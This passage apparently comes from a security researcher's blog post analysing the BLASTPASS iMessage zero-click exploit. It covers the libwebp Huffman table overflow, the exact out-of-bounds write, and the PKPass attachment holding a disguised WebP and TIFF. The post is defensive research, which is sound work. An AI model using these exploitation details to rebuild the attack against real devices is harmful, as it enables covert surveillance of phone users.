 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&amp;nbsp; uint8_t bits;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&amp;nbsp; uint16_t value;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;} HuffmanCode;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://www.darknavy.org/blog/exploiting_the_libwebp_vulnerability_part_1/%23how-to-control-the-data-to-write&quot;&gt;As DarkNavy point out&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, whilst the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;bits&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;value&lt;/span&gt;&lt;span&gt;&amp;nbsp;fields are nominally attacker-controlled, in reality there isn&amp;#39;t that much flexibility. The fifth huffman table (the one at the end of the preallocated buffer, part of which can get written &lt;/span&gt;&lt;span&gt;out-of-bounds&lt;/span&gt;&lt;span&gt;) only has &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;40&lt;/span&gt;&lt;span&gt;&amp;nbsp;symbols, limiting &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;value&lt;/span&gt;&lt;span&gt;&amp;nbsp;to a maximum value of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;39&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x27&lt;/span&gt;&lt;span&gt;) and &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;bits&lt;/span&gt;&lt;span&gt;&amp;nbsp;will be between &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;7&lt;/span&gt;&lt;span&gt;&amp;nbsp;(for a second-level table entry). There&amp;#39;s a padding byte between &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;bits&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;value&lt;/span&gt;&lt;span&gt;&amp;nbsp;which makes the largest value that could be written out-of-bounds &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x00270007&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;. And it just so happens that that&amp;#39;s exactly the value which the exploit does write &amp;mdash; and they likely didn&amp;#39;t have that much choice about it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;There&amp;#39;s also not much flexibility in the huffman table allocation size. The table allocation in the exploit is &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;12072&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x2F28&lt;/span&gt;&lt;span&gt;) bytes, which will get rounded up to fit within a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3000&lt;/span&gt;&lt;span&gt;&amp;nbsp;byte libmalloc &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;small&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;region. The code lengths are chosen such that the overflow occurs like this:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDhw37v8HaNAcUY9lTzT-ePEPn_stvb57BbFv0ktM5_XCGEvQD2Mego6iMH3bBO8EZgWOfhFhg-e5R1YoUquDFdVwBWX6QRHIcccAWJnWQXlxwSU44nDYIQF_MCldcENnaef5JPaCR1Nmam7NrnZD2yng0BPEfrIDnIfww-efdAECA5F4UaSDfGi1dSJY/s766/image10.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDhw37v8HaNAcUY9lTzT-ePEPn_stvb57BbFv0ktM5_XCGEvQD2Mego6iMH3bBO8EZgWOfhFhg-e5R1YoUquDFdVwBWX6QRHIcccAWJnWQXlxwSU44nDYIQF_MCldcENnaef5JPaCR1Nmam7NrnZD2yng0BPEfrIDnIfww-efdAECA5F4UaSDfGi1dSJY/s766/image10.png&quot; border=&quot;0&quot; alt=&quot;Memory layout diagram showing Huffman tables at offset 0x3000 and the structure of a Huffman lookup table entry at offset 0x3058.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Memory layout diagram showing Huffman tables at offset 0x3000 and the structure of a Huffman lookup table entry at offset 0x3058.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;To summarize: The 32-bit value &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x270007&lt;/span&gt;&lt;span&gt;&amp;nbsp;will be written &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x58&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes past the end of a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;byte huffman table allocation. And then WebP parsing will fail, and the decoder will bail out.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.ow3137rwwm6g&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;D&amp;eacute;j&amp;agrave; vu?&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Long-term readers of the Project Zero blog might be experiencing a sense of d&amp;eacute;j&amp;agrave; vu at this point... haven&amp;#39;t I already written a blog post about an NSO zero-click iPhone zero day exploiting a vulnerability in a slightly obscure lossless compression format used in an image parsed from an iMessage attachment?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html&quot;&gt;Indeed&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;BLASTPASS has many similarities with &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/FORCEDENTRY&quot;&gt;FORCEDENTRY&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, and my initial hunch (which turned out to be completely wrong) was that this exploit might take a similar approach to build a weird machine using some fancier WebP features. To that end I started out by writing a WebP parser to see what features were actually used.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.2q4vz1fpty3b&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Transformation&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;In a very similar fashion to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/JBIG2&quot;&gt;JBIG2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, WebP also &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://developers.google.com/speed/webp/docs/webp_lossless_bitstream_specification&quot;&gt;supports&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;invertible transformations on the input pixel data:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisPMddn7TKdOEgMlAvECAc_0pAKivdDJ6Zs0O-FmBK8MOiTFlpnf5SUTXiaHcK0EYE733CtDTMboqnyHpUNw-2FTMA606fQvta_MUm0TPwoY6GeZHctPb-MKo4U73mbXbF0XGAZG4UtB3iqTCW_sUFYvY7VAKxIQJQRc8ZsmE678can0zHE445bOnVVG8/s1964/image12.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisPMddn7TKdOEgMlAvECAc_0pAKivdDJ6Zs0O-FmBK8MOiTFlpnf5SUTXiaHcK0EYE733CtDTMboqnyHpUNw-2FTMA606fQvta_MUm0TPwoY6GeZHctPb-MKo4U73mbXbF0XGAZG4UtB3iqTCW_sUFYvY7VAKxIQJQRc8ZsmE678can0zHE445bOnVVG8/s1200/image12.png&quot; border=&quot;0&quot; alt=&quot;Screenshot of WebP documentation explaining &amp;#39;4 Transforms&amp;#39; and their role in image compression.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Screenshot of WebP documentation explaining &amp;#39;4 Transforms&amp;#39; and their role in image compression.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOaeJ5e_hL-BxqWZFAVyDb38AlNiW53Uf_67I9jiMTNvSRP8sJbF6GOZtxM587_jVZPDvL84Lu2P7D4HshHEwN5Ui3KBUMa7zmv8hh5bMvThElMj7-5k1lefL5siOGS1M2uu8lW-FjV-0ZQSUstBbbkETa10kFbWFE-65ZAb_S5Qpw-fuZvnQ2GusU33I/s1356/image3.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOaeJ5e_hL-BxqWZFAVyDb38AlNiW53Uf_67I9jiMTNvSRP8sJbF6GOZtxM587_jVZPDvL84Lu2P7D4HshHEwN5Ui3KBUMa7zmv8hh5bMvThElMj7-5k1lefL5siOGS1M2uu8lW-FjV-0ZQSUstBbbkETa10kFbWFE-65ZAb_S5Qpw-fuZvnQ2GusU33I/s1200/image3.png&quot; border=&quot;0&quot; alt=&quot;Screenshot of a table listing pixel prediction modes with corresponding formulas for calculating predicted values.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Screenshot of a table listing pixel prediction modes with corresponding formulas for calculating predicted values.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;My initial theory was that the exploit might operate in a similar fashion to FORCEDENTRY and apply sequences of these transformations outside of the bounds of the image buffer to build a weird machine. But after implementing enough of the WebP format in python to parse every bit of the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;VP8L&lt;/span&gt;&lt;span&gt;&amp;nbsp;chunk it became pretty clear that it was only triggering the Huffman table overflow and nothing more. The VP8L chunk was only &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;1052&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;bytes, and pretty much all of it was the 10 Huffman tables needed to trigger the overflow.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.jkdp8pyrc6re&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;What&amp;#39;s in a pass?&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Although BLASTPASS is often referred to as an exploit for &amp;quot;the WebP vulnerability&amp;quot;, the attackers don&amp;#39;t actually just send a WebP file (even though that is supported in iMessage). They send a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://developer.apple.com/documentation/passkit_apple_pay_and_wallet&quot;&gt;PassKit&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;PKPass file, which contains a WebP. There must be a reason for this. So let&amp;#39;s step back and actually take a look at one of the sample files I received:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;171K sample.pkpass&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c34&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;$ file sample.pkpass &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c34&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;sample.pkpass: Zip archive data, at least v2.0 to extract, compression method=deflate&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;There are five files inside the PKPass zip archive:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c34&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;60K &amp;nbsp;background.png&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c34&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;5.5M logo.png&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c34&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;175B manifest.json&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c34&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;18B &amp;nbsp;pass.json&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c34&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;3.3K signature&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The 5.5MB &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;logo.png&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the WebP image, just with a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;.png&lt;/span&gt;&lt;span&gt;&amp;nbsp;extension instead of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;.webp&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c34&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;$ file logo.png:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c34&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;logo.png: &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; RIFF (little-endian) data, Web/P image&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The closest thing to a specification for the PKPass format appears to be the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PassKit_PG/Creating.html&quot;&gt;Wallet Developer Guide&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and whilst it doesn&amp;#39;t explicitly state that the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;.png&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;files should actually be Portable Network Graphics images, that&amp;#39;s presumably the intention. This is yet another parallel with FORCEDENTRY, where a similar trick was used to reach the PDF parser when attempting to parse a GIF.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;PKPass files require a valid signature which is contained in &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;manifest.json&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;. The signature has a presumably fake name and more timestamps indicating that the PKPass is very likely being generated and signed on the fly for each exploit attempt.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;pass.json&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;is just this:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;{&amp;quot;pass&amp;quot;: &amp;quot;PKpass&amp;quot;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Finally &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;background.png&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;$ file background.png &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;background.png: TIFF image data, big-endian, direntries=15, height=16, bps=0, compression=deflate, PhotometricIntepretation=RGB, orientation=upper-left, width=48&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Curious. Another file with a misleading extension; this time a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;TIFF&lt;/span&gt;&lt;span&gt;&amp;nbsp;file with a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;.png&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;extension. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;We&amp;#39;ll return to this TIFF later in the analysis as it plays a critical role in the exploit flow, but for now we&amp;#39;ll focus on the WebP, with one short diversion:&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.cf35pgn7ecq3&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Blastdoor&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;So far I&amp;#39;ve only mentioned the WebP vulnerability, but the Apple advisory I linked at the start of this post mentions two separate CVEs:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;The first, CVE-2023-41064 in ImageIO, is the WebP bug (though just to keep things confusing with a different CVE from the upstream WebP fix which is CVE-2023-4863 - they&amp;#39;re the same vulnerability though).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The second, CVE-2023-41061 in &amp;quot;Wallet&amp;quot;, is described in the Apple advisory as: &amp;quot;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;A maliciously crafted attachment may result in arbitrary code execution&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;quot;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://blog.isosceles.com/the-webp-0day/&quot;&gt;Isosceles blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;hypothesises:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;Citizen Lab called this attack &amp;quot;BLASTPASS&amp;quot;, since the attackers found a clever way to bypass the &amp;quot;BlastDoor&amp;quot; iMessage sandbox. We don&amp;#39;t have the full technical details, but it looks like by bundling an image exploit in a PassKit attachment, the malicious image would be processed in a different, unsandboxed process. This corresponds to the first CVE that Apple released, CVE-2023-41061.&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;This theory makes sense &amp;mdash; FORCEDENTRY had a similar trick where the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html&quot;&gt;JBIG2 bug was actually exploited inside &lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3 XQFzMDWmii-c9&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html&quot;&gt;IMTranscoderAgent&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;instead of the more restrictive sandbox of BlastDoor. But in all my experimentation, as well as all the in-the-wild crash logs I&amp;#39;ve seen, this hypothesis doesn&amp;#39;t seem to hold.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
